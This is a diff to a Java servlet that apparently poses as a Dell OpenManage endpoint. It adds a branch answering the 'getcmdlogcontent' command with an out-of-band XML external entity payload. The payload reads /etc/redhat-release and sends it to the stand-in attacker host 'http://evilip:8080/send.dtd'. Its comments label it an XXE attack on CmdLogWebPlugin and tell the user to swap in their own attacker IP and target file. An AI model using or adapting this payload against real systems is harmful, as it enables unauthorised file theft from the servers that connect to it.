@@ -108,6 +108,13 @@ public class XMLResponder extends HttpServlet {
                     returnStringNode.setTextContent("<SMStatus>0</SMStatus><UserRightsMask>" + (7 + (7 << 16)) + "</UserRightsMask>");
                 } else if (cmd.startsWith("__00omacmd=getaboutinfo ")) {
                     returnStringNode.setTextContent("<ProductVersion>6.0.3</ProductVersion>");
+                } else if (cmd.startsWith("__00omacmd=getcmdlogcontent")) {
+                    // XXE attack against CmdLogWebPlugin ( https://${IP}:1311/${VID}/DataArea?plugin=com.dell.oma.webplugins.CmdLogWebPlugin&vid=${VID} )
+                    // Exfiltration technique borrowed from presentation "What You Didn't Know About XML External Entities Attacks" by Timothy D. Morgan
+                    // Note the send.dtd file in this project; you'll want to change "http://evilip...", *both* below and in evil.dtd, to something reasonable for your environment
+                    // You may also want to change "/etc/redhat-release"
+                    // Be aware, this can be a VERY noisy attack log-wise
+                    returnStringNode.setTextContent("<?xml version=\"1.0\" encoding=\"ISO-8859-1\"?><!DOCTYPE bogus [\n  <!ENTITY % file SYSTEM \"file:///etc/redhat-release\">\n  <!ENTITY % dtd SYSTEM \"http://evilip:8080/send.dtd\">\n%dtd;\n%send;\n]]>\n<bogus><blah /></bogus>");
                 } else {
                     throw new IllegalArgumentException("Unrecognized input");
                 }
